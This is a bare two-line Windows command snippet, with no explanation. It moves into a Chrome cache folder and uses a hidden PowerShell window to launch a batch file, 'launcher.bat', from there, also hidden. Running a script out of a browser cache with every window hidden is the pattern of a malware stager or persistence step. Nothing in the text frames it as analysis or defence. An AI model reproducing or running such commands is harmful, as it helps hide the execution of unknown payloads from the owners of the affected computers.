cd %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cache\Cache_Data\Cached
powershell -WindowStyle Hidden -Command "Start-Process 'launcher.bat' -WindowStyle Hidden"